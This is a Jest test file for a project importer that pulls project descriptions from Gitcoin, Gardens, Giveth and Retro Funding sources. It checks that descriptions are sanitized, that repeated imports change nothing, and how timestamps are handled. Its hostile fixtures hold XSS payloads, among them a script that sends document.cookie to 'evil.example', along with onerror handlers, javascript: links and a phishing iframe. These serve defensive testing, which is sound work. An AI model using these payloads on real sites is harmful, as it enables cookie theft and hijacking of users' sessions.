import {
  afterAll,
  afterEach,
  beforeAll,
  beforeEach,
  describe,
  expect,
  jest,
  test,
} from "@jest/globals";
import { EntityManager } from "typeorm";
import { closeConnection, deleteAll, getTestEntityManager } from "./utils";
import { Project } from "../model";
import { updateOrCreateProject } from "../features/import-projects/helpers";
import { processProjectsBatch as processGitcoinBatch } from "../features/import-projects/gitcoin/helpers";
import { processProjectsBatch as processGardensBatch } from "../features/import-projects/gardens/helpers";
import { processProjectsBatch as processGivethBatch } from "../features/import-projects/giveth/helpers";
import { saveBatchProjects as saveRfBatch } from "../features/import-projects/rf/helpers";
import { gitcoinSourceConfig } from "../features/import-projects/gitcoin/constants";
import { gardensSourceConfig } from "../features/import-projects/gardens/constants";
import { givethSourceConfig } from "../features/import-projects/giveth/constants";
import { rfSourceConfig } from "../features/import-projects/rf/constants";
import { rlSourceConfig } from "../features/import-projects/retroList/constants";
import { rpgf3SourceConfig } from "../features/import-projects/rpgf/constants";

// What an attacker controls: the description text of a project registered on
// a source platform. Written as markdown with HTML mixed in, which is what
// Gitcoin and Gardens hand to the markdown converter.
const HOSTILE_MARKDOWN = [
  "# Our project",
  "",
  "We build **public goods**. [Docs](https://example.com/docs)",
  "",
  '<img src=x onerror="alert(document.domain)">',
  "",
  "<script>fetch('https://evil.example/' + document.cookie)</script>",
  "",
  '<a href="javascript:alert(1)" onclick="alert(2)">claim</a>',
  "",
  '<iframe src="https://evil.example/phish"></iframe>',
  "",
  "<svg onload=alert(3)></svg>",
].join("\n");

const HOSTILE_HTML =
  '<h2 onmouseover="alert(1)">About</h2>' +
  '<p class="ql-indent-1" style="text-align: center; position: fixed">We <strong>build</strong>.</p>' +
  "<script>alert(1)</script>" +
  '<img src="https://example.com/a.png" onerror="alert(1)">' +
  '<a href="javascript:alert(1)">claim</a>' +
  '<iframe src="https://evil.example/phish"></iframe>' +
  '<iframe class="ql-video" src="https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1"></iframe>';

const expectNoExecutableMarkup = (html: string | null | undefined) => {
  expect(html).toBeTruthy();
  expect(html).not.toMatch(/<script|<svg|javascript:|evil\.example/i);
  expect(html).not.toMatch(/<[^>]*\son[a-z]+\s*=/i);
};

let em: EntityManager;
const stored = (id: string) =>
  em.getRepository(Project).findOneByOrFail({ id });

beforeAll(async () => {
  em = await getTestEntityManager();
});
afterAll(async () => {
  await closeConnection();
});
beforeEach(async () => {
  await deleteAll(em, Project);
});
afterEach(() => {
  jest.restoreAllMocks();
});

describe("descriptions are sanitized before they are stored", () => {
  test("gitcoin: markdown is converted, then sanitized", async () => {
    const tally = await processGitcoinBatch([
      {
        id: "0xGitcoin1",
        name: "Gitcoin project",
        metadata: {
          type: "project",
          description: HOSTILE_MARKDOWN,
          createdAt: 1700000000000,
        },
      } as any,
    ]);
    expect(tally.written).toBe(1);

    const project = await stored("gitcoin-0xgitcoin1");
    expectNoExecutableMarkup(project.descriptionHtml);
    expect(project.descriptionHtml).toContain("<h1>Our project</h1>");
    expect(project.descriptionHtml).toContain("<strong>public goods</strong>");
    expect(project.descriptionHtml).toContain(
      '<a href="https://example.com/docs" target="_blank" rel="noopener noreferrer nofollow">Docs</a>'
    );
    expect(project.descriptionHtml).not.toContain("<iframe");
    // The markdown source is text, kept exactly as the platform served it.
    expect(project.description).toBe(HOSTILE_MARKDOWN);
    expect(project.descriptionSummary).toContain("We build public goods.");
    expect(project.descriptionSummary).not.toMatch(/<|alert|evil\.example/);
  });

  test("gardens: the IPFS covenant is converted, then sanitized", async () => {
    jest.spyOn(globalThis, "fetch").mockResolvedValue(
      new Response(JSON.stringify({ covenant: HOSTILE_MARKDOWN }), {
        headers: { "content-type": "application/json" },
      })
    );
    const tally = await processGardensBatch([
      {
        id: "0xGarden1",
        chainId: 10,
        communityName: "Garden",
        covenantIpfsHash: "QmHash",
        registerToken: "0xtoken",
      },
    ]);
    expect(tally.written).toBe(1);

    const project = await stored("gardens-0xgarden1");
    expectNoExecutableMarkup(project.descriptionHtml);
    expect(project.descriptionHtml).toContain("<h1>Our project</h1>");
    expect(project.description).toBe(HOSTILE_MARKDOWN);
  });

  test("gardens: a covenant that is not a string cannot carry markup either", async () => {
    jest.spyOn(globalThis, "fetch").mockResolvedValue(
      new Response(
        JSON.stringify({
          covenant: { text: "<img src=x onerror=alert(1)>" },
        }),
        { headers: { "content-type": "application/json" } }
      )
    );
    await processGardensBatch([
      { id: "0xGarden2", chainId: 10, covenantIpfsHash: "QmHash" },
    ]);
    const project = await stored("gardens-0xgarden2");
    expect(project.descriptionHtml).not.toMatch(/onerror/i);
  });

  test("giveth: the editor HTML in `description` is sanitized", async () => {
    const tally = await processGivethBatch([
      {
        id: "77",
        title: "Giveth project",
        description: HOSTILE_HTML,
        slug: "giveth-project",
        image: null,
        creationDate: "2026-01-01T00:00:00.000Z",
      },
    ]);
    expect(tally.written).toBe(1);

    const project = await stored("giveth-77");
    expectNoExecutableMarkup(project.description);
    expect(project.description).toContain("<h2>About</h2>");
    expect(project.description).toContain(
      '<p class="ql-indent-1" style="text-align:center">We <strong>build</strong>.</p>'
    );
    expect(project.description).toContain(
      '<img src="https://example.com/a.png" />'
    );
    // The video embed is kept, rebuilt from its id; the other frame is gone.
    expect(project.description).toContain(
      'src="https://www.youtube.com/embed/dQw4w9WgXcQ"'
    );
    expect(project.description!.match(/<iframe/g)).toHaveLength(1);
    expect(project.descriptionHtml).toBeNull();
    expect(project.descriptionSummary).toContain("We build.");
    expect(project.descriptionSummary).not.toContain("alert");
  });

  test("giveth: a project without a description stays without one", async () => {
    await processGivethBatch([
      {
        id: "78",
        title: "Empty",
        description: null,
        slug: "empty",
        image: null,
        creationDate: "2026-01-01T00:00:00.000Z",
      },
    ]);
    const project = await stored("giveth-78");
    expect(project.description).toBeNull();
    expect(project.descriptionHtml).toBeNull();
  });

  // These sources publish plain text. It is stored as text - never converted
  // into markup - and no HTML field is produced from it.
  const TEXT = 'Impact: a < b && c > d. See <script>alert(1)</script> "docs"';

  test("retro funding: plain text is stored verbatim, with no HTML field", async () => {
    const tally = await saveRfBatch(
      [{ id: "0xRf1", name: "RF project", description: TEXT } as any],
      4
    );
    expect(tally.written).toBe(1);
    const project = await stored("rf-0xrf1");
    expect(project.description).toBe(TEXT);
    expect(project.descriptionHtml).toBeNull();
  });

  test("retroList and rpgf3: plain text is stored verbatim, with no HTML field", async () => {
    await updateOrCreateProject(
      {
        id: "0xRl1",
        name: "RL",
        description: TEXT,
        prelimResult: "Keep",
        rfRound: 5,
      },
      rlSourceConfig
    );
    await updateOrCreateProject(
      { RPGF3Id: "0xRpgf1", name: "RPGF", impactDescription: TEXT },
      rpgf3SourceConfig
    );
    for (const id of ["rf-0xrl1", "rpgf3-0xrpgf1"]) {
      const project = await stored(id);
      expect(project.description).toBe(TEXT);
      expect(project.descriptionHtml).toBeNull();
    }
  });

  test("no source can store an HTML field that was not sanitized", async () => {
    const configs = [
      gitcoinSourceConfig,
      gardensSourceConfig,
      givethSourceConfig,
      rfSourceConfig,
      rlSourceConfig,
      rpgf3SourceConfig,
    ];
    let n = 0;
    for (const config of configs) {
      // Even a source that is not expected to send HTML is covered, should a
      // configuration ever name an HTML field for it.
      const withHtmlField = { ...config, descriptionHtmlField: "html" };
      const id = `p${n++}`;
      const outcome = await updateOrCreateProject(
        {
          [config.idField]: id,
          [config.titleField]: "t",
          [config.descriptionField]: "text",
          html: HOSTILE_HTML,
          prelimResult: "Keep",
        },
        withHtmlField
      );
      expect(outcome).toBe("created");
      const project = await stored(`${config.source}-${id}`);
      expectNoExecutableMarkup(project.descriptionHtml);
    }
  });
});

describe("rows stored before sanitization", () => {
  const gitcoinProject = {
    id: "0xLegacy",
    name: "Legacy",
    metadata: {
      type: "project",
      description: HOSTILE_MARKDOWN,
      createdAt: 1700000000000,
    },
  } as any;

  test("the next import rewrites them, and then leaves them alone", async () => {
    await processGitcoinBatch([gitcoinProject]);
    const clean = (await stored("gitcoin-0xlegacy")).descriptionHtml;

    // Put the row back to what the importer used to write.
    await em
      .getRepository(Project)
      .update(
        { id: "gitcoin-0xlegacy" },
        { descriptionHtml: '<p>old</p><img src=x onerror="alert(1)">' }
      );

    expect(await processGitcoinBatch([gitcoinProject])).toMatchObject({
      written: 1,
      unchanged: 0,
    });
    expect((await stored("gitcoin-0xlegacy")).descriptionHtml).toBe(clean);

    // Sanitized output compares equal to the stored value: no further write.
    expect(await processGitcoinBatch([gitcoinProject])).toMatchObject({
      written: 0,
      unchanged: 1,
    });
  });

  test("a giveth row is rewritten once, then reported unchanged", async () => {
    const project = {
      id: "90",
      title: "Legacy giveth",
      description: HOSTILE_HTML,
      url: "/project/legacy",
      image: null,
      creationDate: "2026-01-01T00:00:00.000Z",
    };
    expect(await updateOrCreateProject(project, givethSourceConfig)).toBe(
      "created"
    );
    await em
      .getRepository(Project)
      .update({ id: "giveth-90" }, { description: HOSTILE_HTML });

    expect(await updateOrCreateProject(project, givethSourceConfig)).toBe(
      "updated"
    );
    expectNoExecutableMarkup((await stored("giveth-90")).description);
    expect(await updateOrCreateProject(project, givethSourceConfig)).toBe(
      "unchanged"
    );
  });

  // The listings sort by `lastUpdatedTimestamp`. Replacing stored markup with
  // its sanitized form is not a project update and must not reorder them.
  describe("lastUpdatedTimestamp", () => {
    const OLD = new Date("2026-06-03T00:00:00.000Z");
    const project = {
      id: "91",
      title: "Timestamps",
      description: HOSTILE_HTML,
      url: "/project/timestamps",
      image: null,
      creationDate: "2026-01-01T00:00:00.000Z",
    };
    const storeRaw = async (values: Partial<Project>) => {
      await updateOrCreateProject(project, givethSourceConfig);
      await em
        .getRepository(Project)
        .update({ id: "giveth-91" }, { lastUpdatedTimestamp: OLD, ...values });
    };

    test("is kept when only the stored markup is sanitized", async () => {
      await storeRaw({ description: HOSTILE_HTML });
      expect(await updateOrCreateProject(project, givethSourceConfig)).toBe(
        "updated"
      );
      const row = await stored("giveth-91");
      expectNoExecutableMarkup(row.description);
      expect(row.lastUpdatedTimestamp).toEqual(OLD);
    });

    test("is kept for a sanitized `descriptionHtml` too", async () => {
      const gitcoin = {
        id: "0xTs",
        title: "t",
        description: "text",
        descriptionHtml: "<p>text</p>",
        url: "#/projects/0xTs",
        image: "",
        creationDate: null,
      };
      await updateOrCreateProject(gitcoin, gitcoinSourceConfig);
      await em.getRepository(Project).update(
        { id: "gitcoin-0xts" },
        {
          lastUpdatedTimestamp: OLD,
          descriptionHtml: '<p onclick="alert(1)">text</p>',
        }
      );
      expect(await updateOrCreateProject(gitcoin, gitcoinSourceConfig)).toBe(
        "updated"
      );
      const row = await stored("gitcoin-0xts");
      expect(row.descriptionHtml).toBe("<p>text</p>");
      expect(row.lastUpdatedTimestamp).toEqual(OLD);
    });

    test("moves when the description changed at the source", async () => {
      await storeRaw({ description: "<p>An older text</p>" });
      await updateOrCreateProject(project, givethSourceConfig);
      const row = await stored("giveth-91");
      expect(row.lastUpdatedTimestamp.getTime()).toBeGreaterThan(OLD.getTime());
    });

    test("moves when another field changed along with the markup", async () => {
      await storeRaw({ description: HOSTILE_HTML, title: "Old title" });
      await updateOrCreateProject(project, givethSourceConfig);
      const row = await stored("giveth-91");
      expect(row.title).toBe("Timestamps");
      expect(row.lastUpdatedTimestamp.getTime()).toBeGreaterThan(OLD.getTime());
    });

    test("moves for a plain-text description, which is never reformatted", async () => {
      const rf = { id: "0xTs2", name: "RF", description: "new text" };
      await updateOrCreateProject(rf, rfSourceConfig);
      await em
        .getRepository(Project)
        .update(
          { id: "rf-0xts2" },
          { lastUpdatedTimestamp: OLD, description: "<b>new text</b>" }
        );
      await updateOrCreateProject(rf, rfSourceConfig);
      const row = await stored("rf-0xts2");
      expect(row.lastUpdatedTimestamp.getTime()).toBeGreaterThan(OLD.getTime());
    });
  });

  test("a rewritten description is logged by size, not by content", async () => {
    const project = {
      id: "92",
      title: "Logs",
      description: HOSTILE_HTML,
      url: "/project/logs",
      image: null,
      creationDate: "2026-01-01T00:00:00.000Z",
    };
    await updateOrCreateProject(project, givethSourceConfig);
    await em
      .getRepository(Project)
      .update({ id: "giveth-92" }, { description: HOSTILE_HTML });

    const log = jest.spyOn(console, "log").mockImplementation(() => {});
    await updateOrCreateProject(project, givethSourceConfig);
    const lines = log.mock.calls.map((call) => call.join(" ")).join("\n");
    expect(lines).toMatch(/description changed \(\d+ chars -> \d+ chars\)/);
    expect(lines).not.toContain("alert(1)");
    expect(lines).not.toContain("<h2");
  });
});

describe("a description that cannot be sanitized", () => {
  test("fails that project without storing anything, and the batch goes on", async () => {
    const unprintable = {
      toString() {
        throw new Error("no string form");
      },
    };
    const log = jest.spyOn(console, "log").mockImplementation(() => {});
    const tally = await processGivethBatch([
      {
        id: "95",
        title: "Bad",
        description: unprintable as any,
        slug: "bad",
        image: null,
        creationDate: "2026-01-01T00:00:00.000Z",
      },
      {
        id: "96",
        title: "Good",
        description: "<p>fine</p>",
        slug: "good",
        image: null,
        creationDate: "2026-01-01T00:00:00.000Z",
      },
    ]);
    expect(tally).toMatchObject({ written: 1, failed: 1 });
    expect(log.mock.calls.join(" ")).toContain("no string form");
    expect(
      await em.getRepository(Project).findOneBy({ id: "giveth-95" })
    ).toBeNull();
    expect((await stored("giveth-96")).description).toBe("<p>fine</p>");
  });
});

// A second import of the same source data must not touch the row. Every case
// here is a description the listings show without any text, which used to be
// taken for a row whose summary had never been set.
describe("repeated imports of an unchanged project", () => {
  const OLD = new Date("2026-06-03T00:00:00.000Z");
  const IMAGE_ONLY = '<p><img src="https://example.com/banner.png"></p>';
  const VIDEO_ONLY =
    '<iframe class="ql-video" src="https://www.youtube.com/embed/dQw4w9WgXcQ"></iframe>';
  const EMPTY_PARAGRAPH = "<p><br></p>";

  const givethProject = (description: unknown) => ({
    id: "95",
    title: "Idempotent",
    description,
    url: "/project/idempotent",
    image: "https://example.com/i.png",
    creationDate: "2026-01-01T00:00:00.000Z",
  });
  const age = () =>
    em
      .getRepository(Project)
      .update({ id: "giveth-95" }, { lastUpdatedTimestamp: OLD });
  const updates = () =>
    (console.log as jest.Mock).mock.calls.filter(([line]) =>
      String(line).includes("Project Updated")
    );

  beforeEach(() => {
    jest.spyOn(console, "log").mockImplementation(() => {});
  });

  test.each([
    ["an image and no text", IMAGE_ONLY],
    ["a video and no text", VIDEO_ONLY],
    ["an empty paragraph", EMPTY_PARAGRAPH],
    ["an empty string", ""],
    ["no description at all", undefined],
    ["a null description", null],
  ])("giveth: %s is written once", async (_name, description) => {
    const project = givethProject(description);
    expect(await updateOrCreateProject(project, givethSourceConfig)).toBe(
      "created"
    );
    await age();

    for (let run = 0; run < 3; run++) {
      expect(await updateOrCreateProject(project, givethSourceConfig)).toBe(
        "unchanged"
      );
    }
    expect(updates()).toHaveLength(0);
    expect((await stored("giveth-95")).lastUpdatedTimestamp).toEqual(OLD);
  });

  test("gitcoin and gardens: a description with no text is written once", async () => {
    const gitcoin = {
      id: "0xImage",
      name: "Image only",
      metadata: {
        type: "project",
        description: "![banner](https://example.com/banner.png)",
        createdAt: 1700000000000,
      },
    } as any;
    expect(await processGitcoinBatch([gitcoin])).toMatchObject({ written: 1 });
    expect((await stored("gitcoin-0ximage")).descriptionSummary).toBe("");
    await em
      .getRepository(Project)
      .update({ id: "gitcoin-0ximage" }, { lastUpdatedTimestamp: OLD });

    for (let run = 0; run < 2; run++) {
      expect(await processGitcoinBatch([gitcoin])).toMatchObject({
        written: 0,
        unchanged: 1,
      });
    }
    expect((await stored("gitcoin-0ximage")).lastUpdatedTimestamp).toEqual(OLD);
  });

  test("a project with missing optional fields is written once", async () => {
    const project = { id: "96", title: "Sparse" };
    expect(await updateOrCreateProject(project, givethSourceConfig)).toBe(
      "created"
    );
    expect(await updateOrCreateProject(project, givethSourceConfig)).toBe(
      "unchanged"
    );
  });

  test("a row whose stored summary is out of date is refreshed without being re-dated", async () => {
    const project = givethProject("<p>Some <strong>text</strong></p>");
    await updateOrCreateProject(project, givethSourceConfig);
    await em
      .getRepository(Project)
      .update(
        { id: "giveth-95" },
        { lastUpdatedTimestamp: OLD, descriptionSummary: "stale" }
      );

    expect(await updateOrCreateProject(project, givethSourceConfig)).toBe(
      "updated"
    );
    const row = await stored("giveth-95");
    expect(row.descriptionSummary).toBe("Some text");
    expect(row.lastUpdatedTimestamp).toEqual(OLD);
    expect(await updateOrCreateProject(project, givethSourceConfig)).toBe(
      "unchanged"
    );
  });

  test("a text-less description that changes at the source is re-dated", async () => {
    await updateOrCreateProject(givethProject(IMAGE_ONLY), givethSourceConfig);
    await age();

    expect(
      await updateOrCreateProject(givethProject(VIDEO_ONLY), givethSourceConfig)
    ).toBe("updated");
    const row = await stored("giveth-95");
    expect(row.description).toContain("youtube.com/embed/dQw4w9WgXcQ");
    expect(row.lastUpdatedTimestamp!.getTime()).toBeGreaterThan(OLD.getTime());
  });

  test("a description that loses its text at the source is re-dated and its summary cleared", async () => {
    await updateOrCreateProject(
      givethProject("<p>Words</p>"),
      givethSourceConfig
    );
    await age();

    expect(
      await updateOrCreateProject(givethProject(IMAGE_ONLY), givethSourceConfig)
    ).toBe("updated");
    const row = await stored("giveth-95");
    expect(row.descriptionSummary).toBe("");
    expect(row.lastUpdatedTimestamp!.getTime()).toBeGreaterThan(OLD.getTime());
    expect(
      await updateOrCreateProject(givethProject(IMAGE_ONLY), givethSourceConfig)
    ).toBe("unchanged");
  });
});

// An update leaves a column alone when its new value is `undefined`, so a
// field the source stops sending has to be written as NULL - otherwise the
// old value stays and every later import finds the same difference again.
describe("a value the source clears is cleared in the row", () => {
  const OLD = new Date("2026-06-03T00:00:00.000Z");
  const gitcoin = (description: string) =>
    ({
      id: "0xCleared",
      name: "Cleared",
      metadata: { type: "project", description, createdAt: 1700000000000 },
    }) as any;

  beforeEach(() => {
    jest.spyOn(console, "log").mockImplementation(() => {});
  });

  test("gitcoin: clearing the description clears the stored HTML, once", async () => {
    await processGitcoinBatch([gitcoin("Old **text**")]);
    expect((await stored("gitcoin-0xcleared")).descriptionHtml).toContain(
      "<strong>text</strong>"
    );

    expect(await processGitcoinBatch([gitcoin("")])).toMatchObject({
      written: 1,
    });
    const row = await stored("gitcoin-0xcleared");
    expect(row.descriptionHtml).toBeNull();
    expect(row.descriptionSummary).toBe("");

    await em
      .getRepository(Project)
      .update({ id: "gitcoin-0xcleared" }, { lastUpdatedTimestamp: OLD });
    for (let run = 0; run < 2; run++) {
      expect(await processGitcoinBatch([gitcoin("")])).toMatchObject({
        written: 0,
        unchanged: 1,
      });
    }
    expect((await stored("gitcoin-0xcleared")).lastUpdatedTimestamp).toEqual(
      OLD
    );
  });

  test("giveth: fields the source stops sending are cleared, once", async () => {
    const full = {
      id: "97",
      title: "Shrinking",
      description: "<p>Words</p>",
      url: "/project/shrinking",
      image: "https://example.com/i.png",
      creationDate: "2026-01-01T00:00:00.000Z",
    };
    await updateOrCreateProject(full, givethSourceConfig);

    const sparse = { id: "97", title: "Shrinking" };
    expect(await updateOrCreateProject(sparse, givethSourceConfig)).toBe(
      "updated"
    );
    expect(await stored("giveth-97")).toMatchObject({
      title: "Shrinking",
      description: null,
      descriptionSummary: "",
      url: null,
      image: null,
      sourceCreatedAt: null,
    });
    expect(await updateOrCreateProject(sparse, givethSourceConfig)).toBe(
      "unchanged"
    );
  });
});
